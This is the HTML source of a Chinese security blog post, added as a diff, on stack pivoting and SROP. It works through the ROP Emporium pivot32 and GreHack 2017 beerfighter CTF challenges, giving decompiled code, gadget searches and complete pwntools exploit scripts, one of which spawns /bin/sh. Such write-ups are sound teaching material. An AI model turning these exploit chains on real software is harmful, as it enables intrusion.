@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="博客，代码，安全，日常" />
+   
+  <meta name="description" content="记录学习与生活" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Linux Pwn - 栈溢出与ROP（四） |  lzeroyuee&#39;s blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/images/my.png" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="lzeroyuee's blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Linux-Pwn-栈溢出与ROP（四）"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Linux Pwn - 栈溢出与ROP（四）
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/03/07/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E5%9B%9B%EF%BC%89/" class="article-date">
+  <time datetime="2021-03-07T08:56:15.000Z" itemprop="datePublished">2021-03-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">7 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><p>stack pivoting是通过将程序真实栈转移到伪造栈上的攻击技术，可用于绕过不可执行保护或者处理栈空间过小的情况</p>
+<p>stack pivoting的payload构造通常如下，通过控制<code>ebp</code>的值，利用<code>leave</code>指令（等价<code>mov esp, ebp; pop ebp</code>）来控制<code>esp</code>转移到新栈上，然后再利用<code>ret</code>将新栈上的地址弹出给<code>eip</code></p>
+<a id="more"></a>
+
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack:		|<span class="string"> buffer			</span>|<span class="string"> ebp		</span>|<span class="string"> return addr		</span>|</span><br><span class="line">payload:	|<span class="string"> buffer padding	</span>|<span class="string"> fake ebp	</span>|<span class="string"> leave; retn addr	</span>|</span><br></pre></td></tr></table></figure>
+<p>这里由<code>leave</code>指令多弹出来的<code>ebp</code>一般来说用不上就随意给值</p>
+<h3 id="ROP-Emporium-pivot32"><a href="#ROP-Emporium-pivot32" class="headerlink" title="ROP Emporium pivot32"></a>ROP Emporium pivot32</h3><p>该题目开启了NX，ASLR、和PIE，且存在两次输入，第一次输入将数据存入传入参数（堆上），第二次输入可触发缓冲区溢出</p>
+<p>缓冲区输入56个字节，缓冲区距离返回地址44个字节，可用还剩<code>56 - 44 = 12</code>个字节</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">pwnme</span><span class="params">(<span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Call ret2win() from libpivot&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;</span>, buf);	# 打印了buf地址</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Send a ROP chain now and it will land there&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);		<span class="comment">// 读取数据存入堆空间</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now please send your stack smash&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x38</span>u);		<span class="comment">// 缓冲区溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以需要将ROP链放在<code>buf</code>中，通过stack pivoting将栈转移到<code>buf</code>上</p>
+<p>首先将<code>esp</code>劫持到<code>buf</code>上，通过ROPgadget寻找<code>leave|ret</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/stackoverflow/pivot32$ ROPgadget --binary pivot32 --only <span class="string">&quot;leave|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080485f5 : leave ; ret</span><br><span class="line">0x08048492 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br></pre></td></tr></table></figure>
+<p>劫持代码如下，选择<code>0x080485f5</code>的gadget，第一个传入<code>0xcccccccc</code>，第二次覆盖<code>ebp</code>的值为泄露出来的<code>buf</code>首地址 - 4，以便<code>leave</code>弹出<code>ebp</code>的时候<code>esp</code>刚好位于<code>buf</code>首地址处</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pivot32&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./pivot32&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;./libpivot32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get leak buf addr</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;pivot: &quot;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leak buf addr =&gt; %s&quot;</span> % <span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 1</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;\xcc\xcc\xcc\xcc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 2</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="comment"># 0x080485f5 : leave ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x080485f5</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">40</span> + p32(buf_addr - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>
+<p>调试刚好异常触发于<code>0xcccccccc</code>处</p>
+<p><img src="/2021/03/07/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E5%9B%9B%EF%BC%89/pivot321.png"></p>
+<p>由于随机基址，需要通过从<code>libpivot32.so</code>中导入的<code>foothold_function</code>函数的got表泄露该函数真实地址，通过计算偏移得到<code>ret2win</code>函数真实地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">foothold_function_plt = e.plt[<span class="string">&quot;foothold_function&quot;</span>]</span><br><span class="line">foothold_function_got = e.got[<span class="string">&quot;foothold_function&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;foothold_function plt =&gt; %s&quot;</span> % <span class="built_in">hex</span>(foothold_function_plt))</span><br><span class="line">log.info(<span class="string">&quot;foothold_function got =&gt; %s&quot;</span> % <span class="built_in">hex</span>(foothold_function_got))</span><br><span class="line">offset = lib.symbols[<span class="string">&quot;ret2win&quot;</span>] - lib.symbols[<span class="string">&quot;foothold_function&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;offset =&gt; %s&quot;</span> % <span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0804882c : pop eax ; ret</span></span><br><span class="line">pop_eax = <span class="number">0x0804882c</span></span><br><span class="line"><span class="comment"># 0x08048830 : mov eax, dword ptr [eax] ; ret</span></span><br><span class="line">mov_eax_Meax = <span class="number">0x08048830</span></span><br><span class="line"><span class="comment"># 0x080484a9 : pop ebx ; ret</span></span><br><span class="line">pop_ebx = <span class="number">0x080484a9</span></span><br><span class="line"><span class="comment"># 0x08048833 : add eax, ebx ; ret</span></span><br><span class="line">add_eax_ebx = <span class="number">0x08048833</span></span><br><span class="line"><span class="comment"># 0x080485f0 : call eax</span></span><br><span class="line">call_eax = <span class="number">0x080485f0</span></span><br><span class="line"></span><br><span class="line">payload = p32(foothold_function_plt) + \	<span class="comment"># 调用foothold_function完成绑定</span></span><br><span class="line">		  p32(pop_eax) + p32(foothold_function_got) + p32(mov_eax_Meax) + \	<span class="comment"># eax = foothold_function真实地址</span></span><br><span class="line">          p32(pop_ebx) + p32(offset) + \	<span class="comment"># ebx = offset</span></span><br><span class="line">          p32(add_eax_ebx) + p32(call_eax)	<span class="comment"># eax = foothold_function + offset =&gt; ret2win</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/07/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E5%9B%9B%EF%BC%89/pivot322.png"></p>
+<h3 id="GreHack-CTF-2017：beerfighter"><a href="#GreHack-CTF-2017：beerfighter" class="headerlink" title="GreHack CTF 2017：beerfighter"></a>GreHack CTF 2017：beerfighter</h3><p>程序开启了NX，且没有动态库，所以需要利用stack pivoting将栈转移到可执行的地方，同时需要自己使用<code>syscall</code>完成系统调用，这就可用利用SROP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/stackoverflow/beerfighter$ checksec beerfighter </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/workspace/stackoverflow/beerfighter/beerfighter&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">pwn@ubuntu:~/workspace/stackoverflow/beerfighter$ ldd beerfighter </span><br><span class="line">	not a dynamic executable</span><br></pre></td></tr></table></figure>
+<p>函数<code>sub_400144</code>有1040字节的缓冲区，主要功能在函数<code>work_400568</code>中并将缓冲区<code>v1</code>传入，其中获取用户输入，执行相应的菜单功能</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400144</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">1040</span>]; <span class="comment">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(v1, <span class="string">&quot;Newcomer&quot;</span>, <span class="number">0x404</span>uLL);            <span class="comment">// 1040字节的缓冲区</span></span><br><span class="line">  put_menu1_40045E();</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)work_400568((__int64)v1) )</span><br><span class="line">    ;</span><br><span class="line">  put_menu2_400222((__int64)&amp;unk_4007A0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里只有1号功能有用，将传入的缓冲区又传给<code>sub_400480</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">work_400568</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// eax</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  num = get_input_40035E((__int64)<span class="string">&quot;Type your action number &gt; &quot;</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( num == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_400480(a1);                             <span class="comment">// 1</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>sub_400480</code>中，获取最大2048字节输入到缓冲区<code>v2</code>中，然后又拷贝到缓冲区<code>a1</code>（为上层函数换进来的1040字节的缓冲区<code>v1</code>）造成缓冲区溢出，最后选择3号菜单，退出程序触发漏洞</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400480</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">2063</span>]; <span class="comment">// [rsp+10h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> num; <span class="comment">// [rsp+81Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    put_menu2_400222((__int64)<span class="string">&quot;Type your character name here &gt; &quot;</span>);</span><br><span class="line">    get_input_4002FA(v2, <span class="number">2048</span>);                 <span class="comment">// 获取输入，最大2048字节</span></span><br><span class="line">    memcpy_40040E((_BYTE *)a1, v2, <span class="number">2048</span>);       <span class="comment">// 拷贝</span></span><br><span class="line">    result = put_menu2_400222((__int64)<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在该程序中<code>.data</code>段可写，也存在<code>pop rax; ret</code>、<code>syscall; ret</code>的gadgets，可用构造<code>sigreturn</code>用来实现SROP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/stackoverflow/beerfighter$ readelf -S beerfighter </span><br><span class="line">There are 8 section headers, starting at offset 0x2078:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">  [ 5] .data             PROGBITS         0000000000602000  00002000</span><br><span class="line">       0000000000000006  0000000000000000  WA       0     0     1</span><br><span class="line">pwn@ubuntu:~/workspace/stackoverflow/beerfighter$ ROPgadget --binary beerfighter --only <span class="string">&quot;pop|ret&quot;</span> | grep rax</span><br><span class="line">0x000000000040077a : pop rax ; ret</span><br><span class="line">pwn@ubuntu:~/workspace/stackoverflow/beerfighter$ ROPgadget --binary beerfighter --only <span class="string">&quot;syscall|ret&quot;</span> | grep syscall</span><br><span class="line">0x0000000000400738 : syscall ; ret</span><br></pre></td></tr></table></figure>
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./beerfighter&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./beerfighter&quot;</span>)</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Type your action number &gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Type your action number &gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Type your character name here &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040077a : pop rax ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x000000000040077a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000400738 : syscall ; ret</span></span><br><span class="line">syscall_addr = <span class="number">0x0000000000400738</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造sigreturn的ROP链</span></span><br><span class="line">sigreturn = p64(pop_rax) + p64(constants.SYS_rt_sigreturn) + p64(syscall_addr)</span><br><span class="line">pyaload = <span class="string">&quot;A&quot;</span> * <span class="number">1048</span> + sigreturn</span><br><span class="line"></span><br><span class="line">data_addr = e.get_section_by_name(<span class="string">&quot;.data&quot;</span>).header.sh_addr + <span class="number">0x20</span>	<span class="comment"># 选定.data段地址</span></span><br><span class="line">new_stack_addr = data_addr + <span class="number">0x8</span>	<span class="comment"># 选定新的栈地址</span></span><br><span class="line">log.info(<span class="string">&quot;data addr =&gt; %s&quot;</span> % <span class="built_in">hex</span>(data_addr))</span><br><span class="line">log.info(<span class="string">&quot;new stack addr =&gt; %s&quot;</span> % <span class="built_in">hex</span>(new_stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># frame - execve()</span></span><br><span class="line">frame_execve = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame_execve.rax = constants.SYS_execve</span><br><span class="line">frame_execve.rdi = data_addr</span><br><span class="line">frame_execve.rsi = <span class="number">0</span></span><br><span class="line">frame_execve.rdx = <span class="number">0</span></span><br><span class="line">frame_execve.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># frame - read()</span></span><br><span class="line"><span class="comment"># 读取&quot;bin/sh&quot;以及后续的sigreturn的ROP链和frame_execve到新栈上</span></span><br><span class="line">frame_read = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame_read.rax = constants.SYS_read</span><br><span class="line">frame_read.rdi = constants.STDIN_FILENO</span><br><span class="line">frame_read.rsi = data_addr</span><br><span class="line">frame_read.rdx = <span class="built_in">len</span>(frame_execve)</span><br><span class="line">frame_read.rsp = new_stack_addr     <span class="comment"># stack pivot</span></span><br><span class="line">frame_read.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发栈溢出，执行sigreturn read</span></span><br><span class="line">p.sendline(pyaload + <span class="built_in">str</span>(frame_read))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Type your action number &gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用sigreturn read读取触发sigreturn execve</span></span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + sigreturn + <span class="built_in">str</span>(frame_execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/07/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E5%9B%9B%EF%BC%89/beerfighter.png"></p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://lzeroyuee.cn/2021/03/07/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E5%9B%9B%EF%BC%89/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" rel="tag">二进制安全</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/03/06/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E4%B8%89%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Linux Pwn - 栈溢出与ROP（三）</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "sJHHqdejjKH1GtEKzxEL80y2-gzGzoHsz",
+    app_key: "oPkDhBajzB1AvNe4r6CxTfU0",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> lzeroyuee
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
+        <span class="division">|</span>
+        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
